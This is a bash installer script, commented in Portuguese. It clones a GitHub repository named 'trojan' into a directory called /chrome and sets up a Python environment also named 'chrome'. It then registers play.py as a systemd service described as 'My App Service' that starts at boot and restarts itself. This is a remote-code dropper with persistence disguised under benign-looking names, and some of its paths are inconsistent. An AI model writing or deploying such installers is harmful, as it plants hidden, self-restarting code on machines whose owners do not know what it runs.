#!/bin/bash

# Antes de iniciar este comando: chmod +x start.sh

# Instalação do Python
sudo apt update
sudo apt install python3
sudo apt install python3-pip
sudo apt-get install python3-venv

# Configurações
venv_name="chrome"
venv_dir="./chrome/venv"
python_executable="python3"
username="suehirokawashima"
repository_url="https://github.com/efraim-lima/trojan"
relative_path="./play.py"
install_directory="/chrome"

# Clone o repositório com permissões de administrador
sudo -u "$username" git clone "$repository_url" "$install_directory"


# Criação do ambiente virtual
$python_executable -m venv $venv_dir/$venv_name

# Ativação do ambiente virtual
source $venv_dir/$venv_name/bin/activate

# Instalação das dependências do requirements.txt (opcional)
$venv_dir/$venv_name/bin/pip install -r requirements.txt

# Execução dos comandos adicionais dentro do ambiente virtual
# ... (adicione seus comandos aqui)

# # Desativação do ambiente virtual
# deactivate

# Criação do arquivo de serviço systemd
service_file="/etc/systemd/system/start.service"
sudo tee "$service_file" > /dev/null <<EOT
[Unit]
Description=My App Service
After=network.target

[Service]
User=$username
ExecStart=$install_directory/$relative_path
Restart=always

[Install]
WantedBy=multi-user.target
EOT

# Habilita e inicia o serviço systemd
sudo systemctl enable start.service
sudo systemctl start start.service